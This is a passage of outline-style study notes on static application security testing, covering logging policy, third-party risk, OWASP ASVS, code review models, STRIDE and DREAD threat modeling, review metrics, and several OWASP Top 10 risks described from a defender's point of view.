&nbsp;					® Which vulnerabilities matter most.

&nbsp;					® Which stakeholders should be included in planning.

&nbsp;					® How to align test priorities with organizational risk exposure.

&nbsp;		○ Key Documentation

&nbsp;			§ Security Incident Response Policy → Defines scope \& responsibilities.

&nbsp;			§ Security Incident Response Plan → Broader execution framework.

&nbsp;			§ Incident Response Procedures/Playbooks → Step-by-step guides for responders under pressure.

&nbsp;				□ High value: tickets from actual incidents → reveal attack vectors (especially if app-related).

&nbsp;		○ Industry Guidance

&nbsp;			§ NIST SP 800-61 Rev. 2: Comprehensive guide on incident handling.

&nbsp;				□ Covers: building teams, equipping them, handling incidents, and internal/external communication.

&nbsp;				□ Mentions applications 44 times → strong tie to AppSec testing relevance.

&nbsp;			§ Practical Takeaway for Testers

&nbsp;				□ Incorporating incident response context into SAST makes your testing:

&nbsp;					® More useful → addresses real-world threats.

&nbsp;					® More relevant → aligned with organizational priorities.

&nbsp;					® More integrated → brings in stakeholders you might otherwise miss.



Logging and Monitoring Policy

&nbsp;	• Effective logging and monitoring policies are critical for detecting, responding to, and preventing security incidents. Weak or missing log controls can make it impossible to determine what happened during an incident. Application security testing (especially static testing) must include reviewing how applications generate, protect, and store logs to ensure compliance, incident response readiness, and long-term forensic capability.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Logging \& Monitoring

&nbsp;			§ Without logs, organizations can’t investigate incidents or determine data theft.

&nbsp;			§ Weak/nonexistent logging = potential business-ending risk.

&nbsp;			§ Logging = foundation; Monitoring (SIEM) = analysis and response layer.

&nbsp;		○ Log Management vs. SIEM

&nbsp;			§ Log Management → Collects and stores system \& application logs for long-term access.

&nbsp;			§ Security Information and Event Management (SIEM) → Analyzes logs in near real-time to detect threats, generate alerts, or trigger automated responses.

&nbsp;			§ Together form a layered pyramid: log management as the base, SIEM as the pinnacle.

&nbsp;		○ Four Questions for Static Testing of Logging

&nbsp;			§ Can the app generate logs?

&nbsp;				□ If not, it may not be production-ready.

&nbsp;			§ Are logs compliant with internal/external requirements?

&nbsp;				□ Policy review determines what must be captured.

&nbsp;			§ Are logs sufficient for near-term incident response?

&nbsp;				□ Should support quick analysis in case of an attack.

&nbsp;			§ Are logs sufficient for long-term forensics?

&nbsp;				□ Must provide meaningful data even a year later.

&nbsp;		○ Standards \& Guidance

&nbsp;			§ NIST SP 800-92 → Guide to Computer Security Log Management; covers infrastructure, log file content, and operational processes.

&nbsp;			§ PCI DSS Section 10 → Simple, concise guidance on events to log and required log contents. Great baseline for developers.

&nbsp;			§ Intelligence Community Standard (ICS) 500-27 → Comprehensive government-grade requirements, including auditable events, log elements, and compromise indicators.

&nbsp;		○ Application Security Testing Implications

&nbsp;			§ Static tests should review the code responsible for generating and protecting logs.

&nbsp;			§ Logging \& monitoring requirements should be built into app design.

&nbsp;			§ Logs are crucial for dynamic testing later (validating security behavior in production-like settings).



Third-Party Agreements

&nbsp;	• Cloud services, SaaS, and third-party developers are now standard in business operations. Since internal teams usually cannot directly test third-party applications, organizations must manage third-party security risk through identification, documentation, contractual requirements, and vulnerability assessments—including for open-source libraries.

&nbsp;	• Key Concepts

&nbsp;		○ Third-Party Risk in Security Testing

&nbsp;			§ You may be authorized to test internal applications, but not third-party apps.

&nbsp;			§ You may be authorized to test internal applications, but not third-party apps.

&nbsp;			§ Using third-party apps extends trust outside the traditional perimeter.

&nbsp;			§ Risk: Attackers may target the weaker third-party vendor rather than the stronger internal org.

&nbsp;			§ Example: A mobile app linked a critical function to a developer’s personal domain instead of the organization’s.

&nbsp;		○ Identifying Third-Party Dependencies

&nbsp;			§ Start with:

&nbsp;				• Purchasing dept. → records of SaaS solutions.

&nbsp;				• Legal dept. → contracts and agreements.

&nbsp;				• Security team → firewall logs showing outbound connections.

&nbsp;				• Risk management team → may track vendor assessments.

&nbsp;				• End users → ask: “What websites do you log into for your job?”

&nbsp;			§ Contractual Security Requirements

&nbsp;				• Work with purchasing and legal to put requirements in writing.

&nbsp;				• Common inclusions:

&nbsp;					® Compliance expectations → vendor must show evidence of alignment with frameworks (ISO 27001, NIST CSF, CIS).

&nbsp;					® Internal security standards → can be required but burdensome for vendors with many clients.

&nbsp;					® Liability clauses → more effective than compliance language; makes vendor financially responsible for damages from insecure code.

&nbsp;				• Example: Dropbox blog on better vendor security assessments

&nbsp;		○ Open-Source Libraries

&nbsp;			§ Unlike vendors, open-source projects have no contracts.

&nbsp;			§ Still must identify and assess open-source dependencies in applications.

&nbsp;			§ Tools for vulnerability detection:

&nbsp;				• Sonatype OSS Index → search engine for vulnerable components (Go, RubyGems, Drupal, etc.).

&nbsp;				• OWASP Dependency-Check → supports Java \& .NET, with experimental support for Ruby, Node.js, Python.

&nbsp;				• Bundler Audit (Ruby) → checks for patch-level verification in Bundler-managed projects.

&nbsp;		○ Implications for Static Application Security Testing (SAST)

&nbsp;			§ Security testers should:

&nbsp;				• Map out third-party SaaS and developer dependencies.

&nbsp;				• Ensure contracts include security, compliance, and liability terms.

&nbsp;				• Scan and verify open-source libraries for known vulnerabilities.

&nbsp;			§ Key principle: Trust but verify—don’t rely on vendor assurances alone.



OWASP ASVS

&nbsp;	• The OWASP Application Security Verification Standard (ASVS) provides a structured framework to measure, test, and communicate application security requirements. It helps organizations align with maturity goals, set expectations with vendors, and verify whether apps meet appropriate levels of security assurance through static and dynamic testing.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of OWASP ASVS

&nbsp;			§ Aids communication between developers, testers, and vendors.

&nbsp;			§ Provides metrics to track application security maturity.

&nbsp;			§ Offers procurement support → organizations can set security requirements for third-party developers.

&nbsp;			§ Functions as a capability maturity model for application security.

&nbsp;		○ ASVS Security Levels

&nbsp;			§ Level 1 (Low assurance):

&nbsp;				□ Focus on basic security controls.

&nbsp;				□ Suitable for apps that don’t handle sensitive data.

&nbsp;				□ Good starting point for teams new to application security.

&nbsp;			§ Level 2 (Standard assurance):

&nbsp;				□ Applies to most applications, especially those handling sensitive or regulated data.

&nbsp;				□ Recommended for apps under HIPAA, PCI DSS, or similar compliance frameworks.

&nbsp;			§ Level 3 (High assurance):

&nbsp;				□ For business-critical applications (24/7 availability, core to the business).

&nbsp;				□ Most effort-intensive to achieve, but provides the highest assurance.

&nbsp;		○ Structure of ASVS

&nbsp;			§ 14 Control Objectives (categories of security controls), e.g.:

&nbsp;				□ Authentication

&nbsp;				□ Session management

&nbsp;				□ Error handling

&nbsp;				□ Stored cryptography

&nbsp;			§ Requirements under each objective:

&nbsp;				□ Define specific security behaviors or features (e.g., algorithms, secrets management).

&nbsp;				□ Tagged with security levels (1–3) based on assurance strength.

&nbsp;		○ CWE Mapping

&nbsp;			§ Each requirement maps to CWE (Common Weakness Enumeration).

&nbsp;			§ Ensures consistency with MITRE/SANS Top 25 software errors.

&nbsp;			§ Helps testers focus on real, common weaknesses.

&nbsp;		○ Application in Testing

&nbsp;			§ ASVS requirements can be verified with:

&nbsp;				□ Static tests (SAST).

&nbsp;				□ Dynamic tests (DAST).

&nbsp;				□ Or a combination depending on organizational approach.

&nbsp;			§ Provides guardrails → helps teams design and prioritize testing activities effectively.



#### Source Code Security Reviews



Challenges of Assessing Source Code

&nbsp;	• Source code reviews for functionality and source code security reviews serve different purposes. While functional reviews confirm that the application works as intended, security reviews assess resilience against attacks, requiring both automated and manual approaches. Implementing code security reviews effectively involves process standardization, tooling, training, and overcoming cultural and resource challenges.

&nbsp;	• Key Concepts

&nbsp;		○ Difference Between Code Review and Code Security Review

&nbsp;			§ Code Review: Ensures functionality (e.g., ZIP Code field lookup works correctly).

&nbsp;			§ Code Security Review: Ensures resilience (e.g., test unexpected input, SQL injection, buffer overflows).

&nbsp;			§ Functional tests may pass while critical vulnerabilities remain undiscovered.

&nbsp;		○ Attacker’s Perspective

&nbsp;			§ Security testing must assume unexpected or malicious input.

&nbsp;			§ Even trivial functions (like ZIP Code lookups) can reveal insecure coding patterns that attackers might exploit elsewhere (e.g., sensitive data tables).

&nbsp;		○ Automated vs. Manual Reviews

&nbsp;			§ Automated Reviews:

&nbsp;				□ Fast, scalable, necessary to meet deadlines.

&nbsp;				□ Cover large codebases quickly.

&nbsp;			§ Manual Reviews:

&nbsp;				□ Provide training and education for developers.

&nbsp;				□ Help developers learn to write secure code the first time.

&nbsp;				□ Identify logic flaws automation might miss.

&nbsp;			§ Best practice: Use both in tandem.

&nbsp;		○ Organizational and Process Challenges

&nbsp;			§ Well-defined processes: Testing cannot be haphazard—prototype, document, iterate.

&nbsp;			§ Resources: Need people with security expertise (in both the security and development teams).

&nbsp;			§ Tools: Free/open-source options exist, but commercial tools may be necessary (cost + training curve).

&nbsp;			§ Timeline pushback: Security testing must be integrated into project planning, not tacked on last-minute.

&nbsp;			§ Training: Developers, testers, and stakeholders need awareness of the process and its value.

&nbsp;		○ Cultural Shift

&nbsp;			§ Developers and testers must understand why secure coding and security reviews matter.

&nbsp;			§ Consistent application of security reviews builds long-term improvements in secure development practices.



OWASP Code Review Guide

&nbsp;	• The OWASP Code Review Guide is a foundational resource for performing source code security reviews, helping organizations integrate secure coding practices into the SDLC. It provides methodology, threat modeling frameworks, practical examples, and aligns with the OWASP Top 10 to improve both static and dynamic application security testing.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose and Scope

&nbsp;			§ Step-by-step framework for performing source code security reviews.

&nbsp;			§ Explains what a code security review is, how to scope it, and how to couple it with penetration testing.

&nbsp;			§ Integrates reviews into the Software Development Life Cycle (SDLC).

&nbsp;		○ Alignment and Practical Guidance

&nbsp;			§ Aligned with the OWASP Top 10 risks.

&nbsp;			§ Provides specific code snippets showing how vulnerabilities may appear in source code.

&nbsp;			§ Shows what to review and how to validate defenses.

&nbsp;			§ Includes internal and external references (e.g., MITRE, Usenix, php.net, Microsoft).

&nbsp;		○ Integration with Other OWASP Resources

&nbsp;			§ Complements the OWASP Testing Guide:

&nbsp;				□ Code Review Guide = Static Application Security Testing (SAST).

&nbsp;				□ Testing Guide = Dynamic Application Security Testing (DAST).

&nbsp;			§ Using both together strengthens application security testing.

&nbsp;		○ Risk and Threat Modeling

&nbsp;			§ Promotes a risk-based approach to prioritize testing.

&nbsp;			§ Emphasizes maturity and business drivers to align security testing with organizational priorities.

&nbsp;			§ Uses threat modeling techniques:

&nbsp;				□ STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).

&nbsp;				□ DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

&nbsp;			§ Helps apply likelihood × impact scoring to prioritize vulnerabilities.

&nbsp;		○ Audience

&nbsp;			§ The guide is designed for three key groups:

&nbsp;				□ Management – Understands why reviews matter, even if not hands-on.

&nbsp;				□ Software leads – Bridges the gap between code reviews and code security reviews.

&nbsp;				□ Code security reviewers – Hands-on practitioners performing the detailed analysis.

&nbsp;		○ Process Considerations

&nbsp;			§ Factors to plan reviews:

&nbsp;				□ Number of lines of code.

&nbsp;				□ Programming languages used.

&nbsp;				□ Available resources and time constraints.

&nbsp;			§ Larger, more complex applications require deeper reviews.

&nbsp;			§ If time/resources are lacking → supplement with additional dynamic testing.

&nbsp;		○ Value Proposition

&nbsp;			§ Prevents teams from being overwhelmed by scope.

&nbsp;			§ Provides a practical, structured methodology that empowers testers and developers.

&nbsp;			§ Encourages adoption across the organization by balancing technical, managerial, and developer perspectives.



Static Code Analysis

&nbsp;	• Static code analysis is critical for application security testing, and automation is essential to achieve comprehensive coverage. Choosing the right tool depends on programming language, cost, support, and organizational needs.

&nbsp;	• Key Concepts

&nbsp;		○ Automation is Essential

&nbsp;			§ Manual reviews alone aren’t scalable.

&nbsp;			§ Automated scanners are required to cover large codebases and consistently detect vulnerabilities.

&nbsp;		○ Language-Specific Tools

&nbsp;			§ Tools must align with the programming language(s) in use.

&nbsp;				□ Bandit → Python security linter.

&nbsp;				□ Brakeman → Ruby on Rails applications.

&nbsp;				□ Puma Scan → C# with real-time scanning.

&nbsp;			§ Using the wrong tool for a language = ineffective (e.g., Bandit on C#).

&nbsp;		○ Cost Considerations

&nbsp;			§ Open-source tools:

&nbsp;				□ Pros → Free, community-driven.

&nbsp;				□ Cons → Requires more manual troubleshooting, limited support.

&nbsp;			§ Commercial tools:

&nbsp;				□ Pros → Paid support, enterprise features.

&nbsp;				□ Cons → Expensive, may include unnecessary complexity (“Aston Martin vs Honda Civic”).

&nbsp;		○ Tool Selection Process

&nbsp;			§ Identify languages in use (from documentation review).

&nbsp;			§ Match tools to languages.

&nbsp;			§ Balance cost vs. support vs. complexity.

&nbsp;			§ Experiment with candidate tools before adopting.

&nbsp;		○ OWASP Resources

&nbsp;			§ OWASP List of Source Code Analysis Tools → Neutral, includes open-source \& commercial options.

&nbsp;			§ OWASP Phoenix Chapter Tools Page → Archived but very comprehensive (covers analyzers, fuzzers, SQLi scanners, etc.).

&nbsp;		○ Organizational Fit

&nbsp;			§ No “one-size-fits-all” solution.

&nbsp;			§ Choice depends on:

&nbsp;				□ Programming languages.

&nbsp;				□ Security budget.

&nbsp;				□ Internal capabilities to support/maintain tools.



Code Review Models

&nbsp;	• Secure code reviews can be conducted at different maturity levels, from informal manual approaches to fully automated systems. The right model depends on organizational resources, risk tolerance, and priorities. Effective reviews should be structured, incremental, supportive, and aligned with internal standards and industry best practices like OWASP.

&nbsp;	• Key Concepts

&nbsp;		○ Code Review Models (increasing maturity)

&nbsp;			§ Over-the-Shoulder: Informal, one developer explains code while another watches.

&nbsp;			§ Pass-Around: Multiple reviewers provide feedback asynchronously.

&nbsp;			§ Walkthrough: Team meets, reviews code together, identifies specific required changes.

&nbsp;			§ Fully Automated: Tools and test cases perform reviews; humans only handle exceptions.

&nbsp;		○ Factors in Choosing a Model

&nbsp;			§ Processes, resources, tools, timelines, training (organizational readiness).

&nbsp;			§ Risk appetite of leadership (CFO, CISO, executives).

&nbsp;			§ Budget constraints (may limit automation options).

&nbsp;		○ Best Practices for Secure Code Reviews

&nbsp;			§ Use OWASP Code Review Guide: checklist of pass/fail questions, applied incrementally (e.g., focus on cryptography, then sessions).

&nbsp;			§ Review manageable chunks: Don’t review too many lines or checklist items at once.

&nbsp;			§ Avoid public shaming: Focus on positive reinforcement and education.

&nbsp;			§ Align with internal standards: Ensure consistency with documented expectations.

&nbsp;		○ Application Security Standards

&nbsp;			§ OWASP Top 10 → lightweight option.

&nbsp;			§ OWASP Code Review Guide Checklist → more detail.

&nbsp;			§ OWASP Application Security Verification Standard (ASVS) → advanced maturity model.

&nbsp;			§ Policy Frameworks → OWASP guidance tied to COBIT, ISO, Sarbanes-Oxley.



Application Threat Modeling: STRIDE

&nbsp;	• The STRIDE model, created by Microsoft, is a systematic framework for identifying six categories of threats to applications (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege). It helps developers and security teams anticipate attacks, think like adversaries, and design mitigations before vulnerabilities are exploited.

&nbsp;	• Key Concepts

&nbsp;		○ What is STRIDE?

&nbsp;			§ Developed by Microsoft (2009) to help defenders evaluate threats to confidentiality, integrity, and availability (CIA) of applications and data.

&nbsp;			§ Mnemonic STRIDE makes threat categories easy to remember.

&nbsp;		○ Six STRIDE Threat Categories

&nbsp;			§ Spoofing (S)

&nbsp;				□ Attacker pretends to be another user (e.g., stolen password).

&nbsp;				□ Risk to authenticity of transactions.

&nbsp;				□ Consider how credentials could be stolen and misused.

&nbsp;			§ Tampering (T)

&nbsp;				□ Unauthorized modification of data (e.g., SQL injection, intercepting transactions).

&nbsp;				□ Risk to integrity of data (at rest or in motion).

&nbsp;			§ Repudiation (R)

&nbsp;				□ Attacker denies performing an action due to lack of evidence/trail.

&nbsp;				□ Risk to non-repudiation (who did what, and when).

&nbsp;				□ E.g., triggering transactions without logs or proof.

&nbsp;			§ Information Disclosure (I)

&nbsp;				□ Exposure of sensitive or configuration data to unauthorized users.

&nbsp;				□ Risk to confidentiality.

&nbsp;				□ Examples: leaked medical records, exposed config files.

&nbsp;			§ Denial of Service (D)

&nbsp;				□ Disruption of service for legitimate users (e.g., DDoS, account lockout abuse).

&nbsp;				□ Risk to availability of the application.

&nbsp;			§ Elevation of Privilege (E)

&nbsp;				□ Attacker gains higher-level access than authorized (e.g., admin rights).

&nbsp;				□ Risk to authorization controls.

&nbsp;				□ Can lead to full application compromise.

&nbsp;		○ Practical Use of STRIDE

&nbsp;			§ Conduct brainstorming sessions with stakeholders to map threats to applications.

&nbsp;			§ Goal: identify 20–40 threats in 2 hours (likely even more with today’s data).

&nbsp;			§ Success requires at least one participant who thinks like an attacker.

&nbsp;			§ Encourage open, creative exploration (pizza + open web searches suggested).



Application Threat Modeling: DREAD

&nbsp;	• DREAD is a threat modeling framework (originated at Microsoft, also covered in the OWASP Code Review Guide) designed to simplify discussions around risk by breaking threats into five attributes: Damage, Reproducibility, Exploitability, Affected Users, Discoverability.

&nbsp;		○ Unlike STRIDE, which classifies threat types, DREAD helps quantify and prioritize risks by scoring them.

&nbsp;		○ Though Microsoft stopped using it in 2008, it remains useful for organizations to structure risk conversations and remediation prioritization.

&nbsp;	• Key Concepts

&nbsp;		○ Origins \& Purpose

&nbsp;			§ Developed by Microsoft, included in OWASP Code Review Guide.

&nbsp;			§ Not meant as a rigorous standard, but as a practical, lightweight framework.

&nbsp;			§ Purpose: structure risk analysis, assign scores, and prioritize remediation.

&nbsp;		○ The Five DREAD Attributes

&nbsp;			§ Damage (D) → Impact if the attack succeeds

&nbsp;				□ Maps to Impact in NIST risk models.

&nbsp;				□ Key questions:

&nbsp;					® How severe would the damage be?

&nbsp;					® Could attacker take full control or crash the system?

&nbsp;			§ Reproducibility (R) → Likelihood of attack success

&nbsp;				□ Maps to Likelihood in risk models.

&nbsp;				□ Key questions:

&nbsp;					® How easy is it to reproduce the attack?

&nbsp;					® Can the exploit be automated?

&nbsp;			§ Exploitability (E) → Effort required for attack

&nbsp;				□ Concerns time, skill, and authentication needs.

&nbsp;				□ Key questions:

&nbsp;					® How much expertise and effort is required?

&nbsp;					® Does attacker need valid credentials?

&nbsp;			§ Affected Users (A) → Scope of impact

&nbsp;				□ Considers who is impacted (regular vs. admin users).

&nbsp;				□ Key questions:

&nbsp;					® What % of users would be affected?

&nbsp;					® Could attacker escalate to admin access?

&nbsp;			§ Discoverability (D) → Likelihood attackers find the vulnerability

&nbsp;				□ Focus on how obvious the vulnerability is.

&nbsp;				□ Key question:

&nbsp;					® How easy is it for an attacker to discover this threat?

&nbsp;				□ Note: security by obscurity is weak, but obscurity can delay exploitation.

&nbsp;		○ Practical Application

&nbsp;			§ Originally used by Microsoft to decide:

&nbsp;				□ Fix in next release?

&nbsp;				□ Issue a service pack?

&nbsp;				□ Release urgent bulletin?

&nbsp;			§ Organizations can adapt scoring models (e.g., 1–10 per attribute) to rank and prioritize threats.

&nbsp;			§ Helps teams decide when and how to apply fixes based on objective scoring.



Code Review Metrics

&nbsp;	• Application security metrics must be tailored to the audience (executives, managers, developers) to be meaningful and actionable. Different stakeholders care about different outcomes: value vs. resources vs. technical gaps. Using frameworks like OWASP metrics projects and the Application Security Verification Standard (ASVS) can guide metric selection.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Metrics

&nbsp;			§ Metrics allow organizations to measure effectiveness, cost vs. value, and progress in application security.

&nbsp;			§ Wrong metrics for the wrong audience = wasted effort.

&nbsp;		○ Audience-Centric Metrics

&nbsp;			§ Executives

&nbsp;				□ Care about strategic value: Is the cost of testing justified by its benefits?

&nbsp;				□ Want cost vs. value metrics (ROI of security activities).

&nbsp;				□ Need decision-making data: budget allocation, headcount, tools.

&nbsp;				□ Expect linkage to security maturity goals of the org.

&nbsp;			§ Managers

&nbsp;				□ Care about tactical execution and resources.

&nbsp;				□ Metrics should highlight resource allocation needs (e.g., % of code analyzed vs. unchecked).

&nbsp;				□ Strong interest in compliance with standards/policies (logging, 2FA, monitoring, etc.).

&nbsp;				□ Roll-up metrics → % of compliant applications across the portfolio.

&nbsp;			§ Developers

&nbsp;				□ Care about closing security gaps in code.

&nbsp;				□ Want granular, actionable metrics: which apps lack logging, monitoring, or protections.

&nbsp;				□ Need visibility into specific vulnerabilities (e.g., injection flaws).

&nbsp;				□ Practical references: OWASP cheat sheets.

&nbsp;			§ OWASP Resources for Metrics

&nbsp;				□ OWASP Security Qualitative Metrics Project:

&nbsp;					® 230 metrics across six categories: architecture, design/implementation, technologies, environment, code generation, dev methodologies, business logic.

&nbsp;				□ OWASP Application Security Guide for CISOs (archived):

&nbsp;					® 106-page PDF with recommended governance and risk-focused metrics.

&nbsp;					® Focus on process metrics, risk metrics, and SDLC security metrics.

&nbsp;			§ No One-Size-Fits-All

&nbsp;				□ Each organization must tailor metrics to context, maturity level, and audience.

&nbsp;				□ Best practice: Use OWASP resources + ASVS as a foundation, then customize.



#### Static Testing for the OWASP Top 10



The OWASP Top 10

&nbsp;	• The OWASP Top 10 is the foundational, globally recognized list of the most critical web application security risks, serving as the best starting point for building a manageable and effective application security testing program.

&nbsp;	• Rather than trying to implement every security measure at once (which can overwhelm teams), organizations should begin with the Top 10 and expand from there.

&nbsp;	• Key Concepts

&nbsp;		○ Start Simple: Walk, Then Run

&nbsp;			§ Avoid overloading teams with overly comprehensive security programs.

&nbsp;			§ Focus first on the OWASP Top 10 as a foundational baseline.

&nbsp;		○ OWASP Top 10

&nbsp;			§ Most mature and widely adopted OWASP project.

&nbsp;			§ Updated every 3 years.

&nbsp;			§ Released in English and translated globally.

&nbsp;			§ Integrated into many commercial and open-source web app security tools.

&nbsp;			§ Serves as the cornerstone of application security practices.

&nbsp;		○ Expansion Beyond Web Applications

&nbsp;			§ OWASP Mobile Application Security Project:

&nbsp;				□ Mobile apps introduce unique risks distinct from web apps.

&nbsp;				□ Includes:

&nbsp;					® Mobile Top 10 list

&nbsp;					® Mobile Application Security Testing Guide

&nbsp;					® Mobile Application Security Verification Standard

&nbsp;					® Mobile App Security Checklist

&nbsp;		○ Shifting Left with Proactive Security

&nbsp;			§ OWASP Proactive Controls Project:

&nbsp;				□ Aimed at developers.

&nbsp;				□ Helps prevent vulnerabilities upfront by embedding secure coding practices.

&nbsp;				□ Moves beyond reactive patching of discovered flaws.

&nbsp;		○ Keep It Manageable

&nbsp;			§ Begin with OWASP Top 10 for quick wins and early successes.

&nbsp;			§ Use additional resources (mobile project, proactive controls) once foundational practices are established.



A1: Broken Access Controls

&nbsp;	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when authenticated users are able to perform actions or access data they should not have access to. Unlike some vulnerabilities, broken access control is difficult for automated tools to detect and requires strong design, frameworks, and manual testing to prevent and identify.

&nbsp;	• Key Concepts

&nbsp;		○ Definition \& Risk

&nbsp;			§ Occurs when applications fail to enforce proper user privileges after authentication.

&nbsp;			§ Occurs when applications fail to enforce proper user privileges after authentication.

&nbsp;			§ Users can access functions or data outside of their intended permissions (e.g., impersonating another user, escalating privileges).

&nbsp;			§ Impact ranges from data exposure to full system compromise.

&nbsp;		○ Challenges in Detection

&nbsp;			§ Automated tools can sometimes detect missing access controls, but they cannot fully understand business rules.

&nbsp;				□ Example: A scanner won’t know whether Dan in accounting should be allowed to reset passwords.

&nbsp;			§ Manual testing is essential to verify if access aligns with business rules.

&nbsp;		○ Access Management Framework

&nbsp;			§ Developers need a framework to guide who can access what.

&nbsp;			§ Without it, broken access flaws are likely to slip in.

&nbsp;			§ Role-Based Access Controls (RBAC) and access control matrices (mapping roles → pages, forms, buttons) are effective tools.

&nbsp;		○ Common Attack Scenarios

&nbsp;			§ Exploiting weak access control to:

&nbsp;				□ View or modify restricted data.

&nbsp;				□ Escalate privileges (e.g., gaining admin access).

&nbsp;				□ Abuse APIs (e.g., unauthorized PUT, POST, DELETE).

&nbsp;			§ Example: Tester manipulated user identifiers after login to impersonate other accounts, eventually escalating to admin.

&nbsp;		○ Prevention Strategies

&nbsp;			§ Default Deny: Start with no access and explicitly grant what’s necessary.

&nbsp;			§ RBAC: Use role-based access consistently.

&nbsp;			§ Reuse Mechanisms: Don’t reinvent; leverage tested frameworks or external directory services.

&nbsp;			§ APIs: Enforce strict HTTP method access control; add rate limiting.

&nbsp;			§ Server Configurations: Disable directory listing at the web server level.

&nbsp;		○ Monitoring \& Compliance

&nbsp;			§ Logging and monitoring are essential:

&nbsp;				□ Developers implement logging.

&nbsp;				□ Security teams monitor logs and respond.'

&nbsp;			§ Often required for compliance (e.g., PCI-DSS, HIPAA).

&nbsp;		○ Helpful OWASP Resources

&nbsp;			§ OWASP Proactive Controls → includes access management principles.

&nbsp;			§ OWASP Authorization Cheat Sheet → explains least privilege, deny by default, and permission validation.



A2: Cryptographic Failures

&nbsp;	• Cryptographic failures (formerly known as Sensitive Data Exposure) occur when applications fail to properly protect sensitive data through encryption, hashing, and secure transmission/storage. These flaws often lead to data breaches, compliance violations, and reputational damage.

&nbsp;	• Key Concepts

&nbsp;		○ Why Cryptographic Failures Matter

&nbsp;			§ Attackers target sensitive data (credentials, financial info, healthcare data).

&nbsp;			§ Gaps in encryption allow theft without exploiting other vulnerabilities like injection or access control.

&nbsp;			§ Worst-case scenario = data breach → financial loss, fines, reputational harm.

&nbsp;		○ Common Weaknesses

&nbsp;			§ Unencrypted data in transit (e.g., using HTTP instead of HTTPS).

&nbsp;			§ Unencrypted data at rest (e.g., passwords stored in plaintext).

&nbsp;			§ Weak/poorly implemented encryption (homegrown algorithms, outdated ciphers).

&nbsp;			§ Improper use of hashing or encoding (confusing encoding with encryption).

&nbsp;			§ Improper key lifecycle management (keys hardcoded, not rotated, or poorly protected).

&nbsp;		○ Encryption vs. Hashing vs. Encoding

&nbsp;			§ Encryption: reversible with a key.

&nbsp;			§ Hashing: one-way; only comparison possible (should be salted for passwords).

&nbsp;			§ Encoding: reversible without keys (e.g., Base64, Hex, ASCII) → not secure.

&nbsp;		○ Risks \& Compliance Implications

&nbsp;			§ Laws with fines for PII/EPHI exposure: GDPR, CCPA, PIPEDA, HIPAA.

&nbsp;			§ Sensitive data definition must come from the organization’s data classification policy.

&nbsp;			§ Example: even a simple policy like “Credit card data must be encrypted” is a good start.

&nbsp;		○ Testing \& Validation

&nbsp;			§ Use data flow diagrams (DFDs) to track how sensitive data moves:

&nbsp;				□ Entry points

&nbsp;				□ Storage (databases, backups)

&nbsp;				□ Transmission (internal/external apps)

&nbsp;			§ Highlight unencrypted storage or transfers.

&nbsp;			§ Check for use of weak or outdated algorithms.

&nbsp;			§ Flag “custom encryption” immediately as a finding.

&nbsp;		○ Best Practices

&nbsp;			§ Encrypt everything (at rest + in transit).

&nbsp;			§ Avoid unnecessary storage/transmission of sensitive data.

&nbsp;			§ Do not assume internal networks are safe — attackers thrive there.

&nbsp;			§ Disable caching of sensitive data.

&nbsp;			§ Use salted hashing for password storage.

&nbsp;			§ Follow OWASP cheat sheets:

&nbsp;				□ Transport Layer Protection

&nbsp;				□ Password Storage

&nbsp;				□ Cryptographic Storage

&nbsp;				□ User Privacy Protection

&nbsp;		○ OWASP Proactive Controls (Control 8)

&nbsp;			§ Classify data.

&nbsp;			§ Encrypt at rest and in transit.

&nbsp;			§ Define processes for:

&nbsp;				□ Key lifecycle management.

&nbsp;				□ Secrets management.



A3: Injection

&nbsp;	• Injection flaws occur when untrusted input is sent to a backend interpreter (SQL, LDAP, OS command, etc.), allowing attackers to manipulate the interpreter into executing unintended commands. They remain one of the most severe and persistent risks in application security.

&nbsp;	• Key Concepts

&nbsp;		○ What Injection Is

&nbsp;			§ Occurs when untrusted data is sent to an interpreter (SQL, LDAP, OS commands, etc.).

&nbsp;			§ Interpreters execute commands without deciding what is “safe.”

&nbsp;			§ Attackers exploit any input that interacts with an interpreter.

&nbsp;		○ Common Attack Vectors

&nbsp;			§ Application parameters, environment variables, web services, and user input.

&nbsp;			§ Examples: login forms, search fields, JSON messages.

&nbsp;			§ Attackers often use escape characters to alter how interpreters read input.

&nbsp;		○ Potential Impacts

&nbsp;			§ Bypass authentication (e.g., SQL injection in login).

&nbsp;			§ Extract or manipulate sensitive data (dump entire databases).

&nbsp;			§ Remote code execution by sending OS-level commands.

&nbsp;			§ Full server takeover.

&nbsp;			§ Business impact: data breaches, service compromise, brand/reputation damage.

&nbsp;		○ Detection Methods

&nbsp;			§ Source code reviews are most effective.

&nbsp;			§ Look for:

&nbsp;				□ Raw SQL queries.

&nbsp;				□ LDAP queries (Active Directory, OpenLDAP).

&nbsp;				□ OS command calls.

&nbsp;				□ Object Relational Mapping (ORM) API calls (which can hide SQL logic).

&nbsp;			§ Collaboration with developers saves time and clarifies ORM/API use.

&nbsp;		○ Prevention Strategies

&nbsp;			§ Safe APIs \& ORM tools: use well-tested libraries instead of hand-coded queries.

&nbsp;			§ Whitelisting input validation: only allow known good values (works for limited sets like postal codes).

&nbsp;			§ Input encoding/sanitization: encode dangerous characters before passing to interpreter.

&nbsp;			§ Parameterized queries/prepared statements: avoid dynamic query building.

&nbsp;			§ Escape characters: if dynamic queries are unavoidable, build in safe escaping mechanisms.

&nbsp;			§ Native controls: use SQL features like LIMIT to minimize data exposure.

&nbsp;			§ Defense-in-depth: combine validation, encoding, and least-privilege query design.

&nbsp;		○ Resources for Developers \& Testers

&nbsp;			§ OWASP Injection Prevention Cheat Sheet: code examples + best practices.

&nbsp;			§ Bobby Tables (xkcd-inspired guide): language-specific guidance for preventing SQL injection.



A4: Insecure Design

&nbsp;	• Insecure design flaws occur when applications are built without security considerations from the start. Unlike implementation bugs that can be patched later, insecure design flaws are baked into the architecture and are much harder and costlier to fix after deployment. Security must be incorporated early in the software development life cycle (SDLC), ideally before any code is written.

&nbsp;	• Key Concepts

&nbsp;		○ Nature of Insecure Design

&nbsp;			§ Design flaws vs. implementation flaws:

&nbsp;				□ Design flaws = security missing at the architecture level.

&nbsp;				□ Implementation flaws = coding mistakes.

